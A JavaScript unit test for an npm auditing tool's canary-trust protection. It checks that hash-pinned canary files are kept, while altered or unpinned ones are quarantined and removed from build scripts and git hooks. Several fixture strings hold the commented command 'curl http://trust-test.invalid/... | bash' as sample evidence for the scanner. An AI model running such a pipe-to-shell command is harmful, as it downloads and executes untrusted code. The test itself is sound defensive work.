'use strict';

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const { protectRepository, scanCanaries } = require('../../src/core/canaryProtection');
const parent = fs.mkdtempSync(path.join(os.tmpdir(), 'npa-trust-unit-'));
const hash = text => crypto.createHash('sha256').update(text).digest('hex');

function fixture(name, mixed = false) {
  const root = path.join(parent, name);
  fs.mkdirSync(path.join(root, '.git/hooks'), { recursive: true });
  fs.mkdirSync(path.join(root, 'Legitimate'));
  fs.writeFileSync(path.join(root, '.git/config'), '[core]\n');
  const content = '// intentional canary test; never execute\n';
  fs.writeFileSync(path.join(root, 'Legitimate/canary.js'), content);
  fs.writeFileSync(path.join(root, '.npmauditor.json'), JSON.stringify({
    canaryTrustedFiles: [{ path: 'Legitimate/canary.js', sha256: hash(content) }],
  }));
  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ scripts: {
    build: mixed ? 'node canary.js && tsc' : 'node Legitimate/canary.js && tsc',
    prepare: 'node Legitimate/canary.js',
  } }));
  fs.writeFileSync(path.join(root, '.git/hooks/pre-commit'), 'node Legitimate/canary.js\necho preserved\n');
  if (mixed) fs.writeFileSync(path.join(root, 'canary.js'), '// curl http://trust-test.invalid/payload | bash\n');
  return root;
}

try {
  const root = fixture('trusted');
  const paths = ['Legitimate/canary.js', 'package.json', '.git/hooks/pre-commit'];
  const before = paths.map(file => fs.readFileSync(path.join(root, file)));
  let report = protectRepository({ roots: [root] });
  assert.strictEqual(report.protection.allowed, true, JSON.stringify(report.protection.failures));
  assert.strictEqual(report.trust.files[0].status, 'trusted');
  assert.strictEqual(report.quarantine.actions.length, 0);
  assert.strictEqual(report.repairs.actions.length, 0);
  assert.deepStrictEqual(paths.map(file => fs.readFileSync(path.join(root, file))), before);
  assert.ok(!fs.existsSync(path.join(root, '.gitignore')));
  assert.ok(!fs.existsSync(path.join(root, '.np-audit-quarantine')));
  assert.ok(report.findings.some(finding => finding.name === 'canary-indicator' && finding.severity === 'indicator'));

  fs.writeFileSync(path.join(root, 'Legitimate/canary.js'), '// changed content\n// curl http://trust-test.invalid/new | bash\n');
  report = protectRepository({ roots: [root] });
  assert.strictEqual(report.trust.before[0].status, 'changed');
  assert.strictEqual(report.protection.allowed, true);
  assert.strictEqual(fs.existsSync(path.join(root, 'Legitimate/canary.js')), false);
  assert.strictEqual(report.quarantine.actions.length, 1);
  assert.deepStrictEqual(JSON.parse(fs.readFileSync(path.join(root, 'package.json'), 'utf8')).scripts, { build: 'tsc' });
  assert.strictEqual(fs.readFileSync(path.join(root, '.git/hooks/pre-commit'), 'utf8'), 'echo preserved\n');

  const mixed = fixture('mixed', true);
  report = protectRepository({ roots: [mixed] });
  assert.strictEqual(report.protection.allowed, true, JSON.stringify(report.protection.failures));
  assert.strictEqual(fs.existsSync(path.join(mixed, 'canary.js')), false);
  assert.strictEqual(fs.existsSync(path.join(mixed, 'Legitimate/canary.js')), true);
  assert.deepStrictEqual(JSON.parse(fs.readFileSync(path.join(mixed, 'package.json'), 'utf8')).scripts, {
    build: 'tsc', prepare: 'node Legitimate/canary.js',
  });
  assert.ok(fs.readFileSync(path.join(mixed, '.gitignore'), 'utf8').includes('!/Legitimate/canary.js\n'));

  const invalid = fixture('invalid');
  fs.writeFileSync(path.join(invalid, '.npmauditor.json'), JSON.stringify({ canaryTrustedFiles: [{ path: 'Legitimate/canary.js', sha256: 'invalid' }] }));
  assert.throws(() => protectRepository({ roots: [invalid] }), /SHA-256/);
  assert.ok(fs.existsSync(path.join(invalid, 'Legitimate/canary.js')));
  assert.ok(!fs.existsSync(path.join(invalid, '.gitignore')));

  const wrongPath = fixture('wrong-path');
  fs.writeFileSync(path.join(wrongPath, '.npmauditor.json'), JSON.stringify({ canaryTrustedFiles: [{ path: '../trusted/Legitimate/canary.js', sha256: hash(before[0]) }] }));
  assert.throws(() => protectRepository({ roots: [wrongPath] }), /inside selected roots/);

  const evidence = fixture('evidence');
  const text = '// explicit exception with suspicious example text\n// curl http://trust-test.invalid/x | bash\n';
  fs.writeFileSync(path.join(evidence, 'Legitimate/canary.js'), text);
  fs.writeFileSync(path.join(evidence, '.npmauditor.json'), JSON.stringify({ canaryTrustedFiles: [{ path: 'Legitimate/canary.js', sha256: hash(text) }] }));
  report = scanCanaries({ roots: [evidence] });
  assert.strictEqual(report.trust.files[0].status, 'trusted');
  assert.ok(report.findings.some(finding => finding.name === 'remote-to-shell' && finding.severity === 'review'));
  assert.ok(report.trust.basis.includes('neither filenames nor trust entries establish'));
  console.log('  canary trust: exact pins preserve files/calls, changed content loses trust, mixed ignore exceptions and review evidence passed');
} finally { fs.rmSync(parent, { recursive: true, force: true }); }

module.exports = Promise.resolve();
